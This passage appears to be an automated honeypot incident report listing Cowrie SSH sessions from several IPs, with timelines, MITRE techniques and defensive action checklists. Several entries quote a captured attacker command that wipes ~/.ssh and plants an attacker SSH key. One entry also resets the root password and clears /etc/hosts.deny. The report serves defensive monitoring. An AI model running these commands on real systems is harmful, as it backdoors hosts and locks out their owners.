| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:20:29` | `cowrie.session.connect` |
| `2026-05-28 11:20:29` | `cowrie.client.version` |
| `2026-05-28 11:20:30` | `cowrie.client.kex` |
| `2026-05-28 11:20:31` | `cowrie.login.success` |
| `2026-05-28 11:20:31` | `cowrie.session.params` |
| `2026-05-28 11:20:31` | `cowrie.command.input` |
| `2026-05-28 11:20:31` | `cowrie.command.failed` |
| `2026-05-28 11:20:32` | `cowrie.log.closed` |
| `2026-05-28 11:20:32` | `cowrie.session.params` |
| `2026-05-28 11:20:32` | `cowrie.command.input` |
| `2026-05-28 11:20:33` | `cowrie.session.file_download` |
| `2026-05-28 11:20:33` | `cowrie.log.closed` |
| `2026-05-28 11:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e62dd22aff6d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]213` |
| **First Seen** | 2026-05-28 11:20 |
| **Last Seen** | 2026-05-28 11:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:20:36` | `cowrie.session.connect` |
| `2026-05-28 11:20:36` | `cowrie.client.version` |
| `2026-05-28 11:20:36` | `cowrie.client.kex` |
| `2026-05-28 11:20:38` | `cowrie.login.success` |
| `2026-05-28 11:20:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]213` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]213` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f809344fe6

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 11:44 |
| **Last Seen** | 2026-05-28 11:46 |
| **Session Duration** | 81s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:44:43` | `cowrie.session.connect` |
| `2026-05-28 11:44:45` | `cowrie.client.version` |
| `2026-05-28 11:44:47` | `cowrie.client.kex` |
| `2026-05-28 11:45:00` | `cowrie.login.success` |
| `2026-05-28 11:45:04` | `cowrie.session.params` |
| `2026-05-28 11:45:04` | `cowrie.command.input` |
| `2026-05-28 11:45:04` | `cowrie.command.failed` |
| `2026-05-28 11:45:08` | `cowrie.log.closed` |
| `2026-05-28 11:45:12` | `cowrie.session.params` |
| `2026-05-28 11:45:12` | `cowrie.command.input` |
| `2026-05-28 11:45:14` | `cowrie.session.file_download` |
| `2026-05-28 11:45:14` | `cowrie.log.closed` |
| `2026-05-28 11:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f140c3c029e

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 11:45 |
| **Last Seen** | 2026-05-28 11:46 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 11:45:46` | `cowrie.session.connect` |
| `2026-05-28 11:45:48` | `cowrie.client.version` |
| `2026-05-28 11:45:50` | `cowrie.client.kex` |
| `2026-05-28 11:46:04` | `cowrie.login.success` |
| `2026-05-28 11:46:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72abf76b776f

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 12:11 |
| **Last Seen** | 2026-05-28 12:12 |
| **Session Duration** | 52s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 12:11:23` | `cowrie.session.connect` |
| `2026-05-28 12:11:26` | `cowrie.client.version` |
| `2026-05-28 12:11:28` | `cowrie.client.kex` |
| `2026-05-28 12:11:38` | `cowrie.login.success` |
| `2026-05-28 12:11:41` | `cowrie.session.params` |
| `2026-05-28 12:11:41` | `cowrie.command.input` |
| `2026-05-28 12:11:41` | `cowrie.command.failed` |
| `2026-05-28 12:11:44` | `cowrie.log.closed` |
| `2026-05-28 12:11:44` | `cowrie.session.params` |
| `2026-05-28 12:11:44` | `cowrie.command.input` |
| `2026-05-28 12:11:44` | `cowrie.session.file_download` |
| `2026-05-28 12:11:44` | `cowrie.log.closed` |
| `2026-05-28 12:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a2ea9a01aa9

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 12:11 |
| **Last Seen** | 2026-05-28 12:12 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 12:11:55` | `cowrie.session.connect` |
| `2026-05-28 12:11:56` | `cowrie.client.version` |
| `2026-05-28 12:11:56` | `cowrie.client.kex` |
| `2026-05-28 12:12:08` | `cowrie.login.success` |
| `2026-05-28 12:12:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3898b4c061ae

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 12:20 |
| **Last Seen** | 2026-05-28 12:21 |
| **Session Duration** | 66s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 12:20:24` | `cowrie.session.connect` |
| `2026-05-28 12:20:26` | `cowrie.client.version` |
| `2026-05-28 12:20:28` | `cowrie.client.kex` |
| `2026-05-28 12:20:42` | `cowrie.login.success` |
| `2026-05-28 12:20:51` | `cowrie.session.params` |
| `2026-05-28 12:20:51` | `cowrie.command.input` |
| `2026-05-28 12:20:51` | `cowrie.command.failed` |
| `2026-05-28 12:20:53` | `cowrie.log.closed` |
| `2026-05-28 12:20:59` | `cowrie.session.params` |
| `2026-05-28 12:20:59` | `cowrie.command.input` |
| `2026-05-28 12:21:02` | `cowrie.session.file_download` |
| `2026-05-28 12:21:02` | `cowrie.log.closed` |
| `2026-05-28 12:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-637b012b0154

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 12:21 |
| **Last Seen** | 2026-05-28 12:21 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 12:21:17` | `cowrie.session.connect` |
| `2026-05-28 12:21:19` | `cowrie.client.version` |
| `2026-05-28 12:21:19` | `cowrie.client.kex` |
| `2026-05-28 12:21:29` | `cowrie.login.success` |
| `2026-05-28 12:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddad80c73568

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 12:29 |
| **Last Seen** | 2026-05-28 12:30 |
| **Session Duration** | 65s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 12:29:23` | `cowrie.session.connect` |
| `2026-05-28 12:29:26` | `cowrie.client.version` |
| `2026-05-28 12:29:26` | `cowrie.client.kex` |
| `2026-05-28 12:29:41` | `cowrie.login.success` |
| `2026-05-28 12:29:51` | `cowrie.session.params` |
| `2026-05-28 12:29:51` | `cowrie.command.input` |
| `2026-05-28 12:29:51` | `cowrie.command.failed` |
| `2026-05-28 12:30:00` | `cowrie.log.closed` |
| `2026-05-28 12:30:03` | `cowrie.session.params` |
| `2026-05-28 12:30:03` | `cowrie.command.input` |
| `2026-05-28 12:30:06` | `cowrie.session.file_download` |
| `2026-05-28 12:30:06` | `cowrie.log.closed` |
| `2026-05-28 12:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b98f3143e31

| Field | Detail |
|---|---|
| **Source IP** | `4.240.82[.]91` |
| **First Seen** | 2026-05-28 12:30 |
| **Last Seen** | 2026-05-28 12:30 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 12:30:15` | `cowrie.session.connect` |
| `2026-05-28 12:30:16` | `cowrie.client.version` |
| `2026-05-28 12:30:19` | `cowrie.client.kex` |
| `2026-05-28 12:30:28` | `cowrie.login.success` |
| `2026-05-28 12:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.240.82[.]91` to AbuseIPDB if not already reported
- [ ] Block `4.240.82[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eda2e53fcbb

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-05-28 13:11 |
| **Last Seen** | 2026-05-28 13:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:11:13` | `cowrie.session.connect` |
| `2026-05-28 13:11:13` | `cowrie.client.version` |
| `2026-05-28 13:11:13` | `cowrie.client.kex` |
| `2026-05-28 13:11:13` | `cowrie.login.success` |
| `2026-05-28 13:11:14` | `cowrie.session.params` |
| `2026-05-28 13:11:14` | `cowrie.command.input` |
| `2026-05-28 13:11:14` | `cowrie.command.failed` |
| `2026-05-28 13:11:14` | `cowrie.log.closed` |
| `2026-05-28 13:11:14` | `cowrie.session.params` |
| `2026-05-28 13:11:14` | `cowrie.command.input` |
| `2026-05-28 13:11:14` | `cowrie.session.file_download` |
| `2026-05-28 13:11:14` | `cowrie.log.closed` |
| `2026-05-28 13:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6292b6996d62

| Field | Detail |
|---|---|
| **Source IP** | `118.193.61[.]170` |
| **First Seen** | 2026-05-28 13:11 |
| **Last Seen** | 2026-05-28 13:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:11:16` | `cowrie.session.connect` |
| `2026-05-28 13:11:16` | `cowrie.client.version` |
| `2026-05-28 13:11:17` | `cowrie.client.kex` |
| `2026-05-28 13:11:17` | `cowrie.login.success` |
| `2026-05-28 13:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.193.61[.]170` to AbuseIPDB if not already reported
- [ ] Block `118.193.61[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6916379aaa38

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-05-28 13:14 |
| **Last Seen** | 2026-05-28 13:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:14:38` | `cowrie.session.connect` |
| `2026-05-28 13:14:38` | `cowrie.client.version` |
| `2026-05-28 13:14:38` | `cowrie.client.kex` |
| `2026-05-28 13:14:38` | `cowrie.login.success` |
| `2026-05-28 13:14:39` | `cowrie.session.params` |
| `2026-05-28 13:14:39` | `cowrie.command.input` |
| `2026-05-28 13:14:39` | `cowrie.command.failed` |
| `2026-05-28 13:14:39` | `cowrie.log.closed` |
| `2026-05-28 13:14:39` | `cowrie.session.params` |
| `2026-05-28 13:14:39` | `cowrie.command.input` |
| `2026-05-28 13:14:39` | `cowrie.session.file_download` |
| `2026-05-28 13:14:39` | `cowrie.log.closed` |
| `2026-05-28 13:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b4b91b8e900

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-05-28 13:14 |
| **Last Seen** | 2026-05-28 13:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:14:42` | `cowrie.session.connect` |
| `2026-05-28 13:14:42` | `cowrie.client.version` |
| `2026-05-28 13:14:42` | `cowrie.client.kex` |
| `2026-05-28 13:14:42` | `cowrie.login.success` |
| `2026-05-28 13:14:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-436bf8385489

| Field | Detail |
|---|---|
| **Source IP** | `120.53.244[.]204` |
| **First Seen** | 2026-05-28 13:24 |
| **Last Seen** | 2026-05-28 13:24 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:64KXXc9jHzAL"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 13:24:05` | `cowrie.session.connect` |
| `2026-05-28 13:24:05` | `cowrie.client.version` |
| `2026-05-28 13:24:05` | `cowrie.client.kex` |
| `2026-05-28 13:24:05` | `cowrie.login.success` |
| `2026-05-28 13:24:06` | `cowrie.session.params` |
| `2026-05-28 13:24:06` | `cowrie.command.input` |
| `2026-05-28 13:24:06` | `cowrie.command.failed` |
| `2026-05-28 13:24:06` | `cowrie.log.closed` |
| `2026-05-28 13:24:06` | `cowrie.session.params` |
| `2026-05-28 13:24:06` | `cowrie.command.input` |
| `2026-05-28 13:24:06` | `cowrie.session.file_download` |
| `2026-05-28 13:24:06` | `cowrie.log.closed` |
| `2026-05-28 13:24:23` | `cowrie.session.params` |
| `2026-05-28 13:24:23` | `cowrie.command.input` |
| `2026-05-28 13:24:23` | `cowrie.log.closed` |
| `2026-05-28 13:24:23` | `cowrie.session.params` |
| `2026-05-28 13:24:23` | `cowrie.command.input` |
| `2026-05-28 13:24:23` | `cowrie.log.closed` |
| `2026-05-28 13:24:24` | `cowrie.session.params` |
| `2026-05-28 13:24:24` | `cowrie.command.input` |
| `2026-05-28 13:24:24` | `cowrie.session.file_download` |
| `2026-05-28 13:24:24` | `cowrie.log.closed` |
| `2026-05-28 13:24:24` | `cowrie.session.params` |
| `2026-05-28 13:24:24` | `cowrie.command.input` |
| `2026-05-28 13:24:24` | `cowrie.log.closed` |
| `2026-05-28 13:24:24` | `cowrie.session.params` |
| `2026-05-28 13:24:24` | `cowrie.command.input` |
| `2026-05-28 13:24:25` | `cowrie.log.closed` |
| `2026-05-28 13:24:25` | `cowrie.session.params` |
| `2026-05-28 13:24:25` | `cowrie.command.input` |
| `2026-05-28 13:24:25` | `cowrie.command.input` |
| `2026-05-28 13:24:25` | `cowrie.log.closed` |
| `2026-05-28 13:24:25` | `cowrie.session.params` |
| `2026-05-28 13:24:25` | `cowrie.command.input` |
| `2026-05-28 13:24:26` | `cowrie.log.closed` |
| `2026-05-28 13:24:26` | `cowrie.session.params` |
| `2026-05-28 13:24:26` | `cowrie.command.input` |
| `2026-05-28 13:24:26` | `cowrie.log.closed` |
| `2026-05-28 13:24:27` | `cowrie.session.params` |
| `2026-05-28 13:24:27` | `cowrie.command.input` |
| `2026-05-28 13:24:27` | `cowrie.log.closed` |
| `2026-05-28 13:24:27` | `cowrie.session.params` |
| `2026-05-28 13:24:27` | `cowrie.command.input` |
| `2026-05-28 13:24:27` | `cowrie.log.closed` |
| `2026-05-28 13:24:27` | `cowrie.session.params` |
| `2026-05-28 13:24:27` | `cowrie.command.input` |
| `2026-05-28 13:24:28` | `cowrie.log.closed` |
| `2026-05-28 13:24:28` | `cowrie.session.params` |
| `2026-05-28 13:24:28` | `cowrie.command.input` |
| `2026-05-28 13:24:28` | `cowrie.log.closed` |
| `2026-05-28 13:24:28` | `cowrie.session.params` |
| `2026-05-28 13:24:28` | `cowrie.command.input` |
| `2026-05-28 13:24:29` | `cowrie.log.closed` |
| `2026-05-28 13:24:29` | `cowrie.session.params` |
| `2026-05-28 13:24:29` | `cowrie.command.input` |
| `2026-05-28 13:24:29` | `cowrie.log.closed` |
| `2026-05-28 13:24:29` | `cowrie.session.params` |
| `2026-05-28 13:24:29` | `cowrie.command.input` |
| `2026-05-28 13:24:30` | `cowrie.log.closed` |
| `2026-05-28 13:24:30` | `cowrie.session.params` |
